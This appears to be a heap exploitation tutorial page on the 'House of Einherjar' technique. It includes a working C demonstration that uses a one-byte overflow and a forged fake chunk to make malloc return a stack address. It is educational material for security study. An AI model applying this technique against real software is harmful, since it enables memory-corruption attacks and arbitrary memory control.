# House of Einherjar

This house is not part of "The Malloc Maleficarum". This heap exploitation technique was given by [Hiroki Matsukuma](https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606) in 2016. This attack also revolves around making 'malloc' return a nearly arbitrary pointer. Unlike other attacks, this requires just a single byte of overflow. There exists much more software vulnerable to a single byte of overflow mainly due to the famous ["off by one"](https://en.wikipedia.org/wiki/Off-by-one_error) error. It overwrites into the 'size' of the next chunk in memory and clears the `PREV_IN_USE` flag to 0. Also, it overwrites into `prev_size` (already in the previous chunk's data region) a fake size. When the next chunk is freed, it finds the previous chunk to be free and tries to consolidate by going back 'fake size' in memory. This fake size is so calculated so that the consolidated chunk ends up at a fake chunk, which will be returned by subsequent malloc.

Consider this sample code (download the complete version [here](../assets/files/house_of_einherjar.c)):

```c
struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[32];               // padding
};

struct chunk_structure *chunk1, fake_chunk;     // fake chunk is at 0x7ffee6b64e90
size_t allotedSize;
unsigned long long *ptr1, *ptr2;
char *ptr;
void *victim;

// Allocate any chunk
// The attacker will overflow 1 byte through this chunk into the next one
ptr1 = malloc(40);                              // at 0x1dbb010

// Allocate another chunk
ptr2 = malloc(0xf8);                            // at 0x1dbb040

chunk1 = (struct chunk_structure *)(ptr1 - 2);
allotedSize = chunk1->size & ~(0x1 | 0x2 | 0x4);
allotedSize -= sizeof(size_t);      // Heap meta data for 'prev_size' of chunk1

// Attacker initiates a heap overflow
// Off by one overflow of ptr1, overflows into ptr2's 'size'
ptr = (char *)ptr1;
ptr[allotedSize] = 0;      // Zeroes out the PREV_IN_USE bit

// Fake chunk
fake_chunk.size = 0x100;   // enough size to service the malloc request
// These two will ensure that unlink security checks pass
// i.e. P->fd->bk == P and P->bk->fd == P
fake_chunk.fd = &fake_chunk;
fake_chunk.bk = &fake_chunk;

// Overwrite ptr2's prev_size so that ptr2's chunk - prev_size points to our fake chunk
// This falls within the bounds of ptr1's chunk - no need to overflow
*(size_t *)&ptr[allotedSize-sizeof(size_t)] =
                                (size_t)&ptr[allotedSize - sizeof(size_t)]  // ptr2's chunk
                                - (size_t)&fake_chunk;

// Free the second chunk. It will detect the previous chunk in memory as free and try
// to merge with it. Now, top chunk will point to fake_chunk
free(ptr2);

victim = malloc(40);                  // Returns address 0x7ffee6b64ea0 !!
```

Note the following:

1. The second chunk's size was given as `0xf8`. This simply ensured that the actual chunk's size has the least significant byte as `0` (ignoring the flag bits). Hence, it was a simple matter to set the previous in use bit to `0` without changing the size of this chunk.
2. The `allotedSize` was further decreased by `sizeof(size_t)`. `allotedSize` is equal to the size of the complete chunk. However, the size allowed for data is `sizeof(size_t)` less, or the equivalent of the `size` parameter in the heap. This is because `size` and `prev_size` of the current chunk cannot be used, but the `prev_size` of the next chunk can be used.
3. Fake chunk's forward and backward pointers were adjusted to pass the security check in `unlink`.
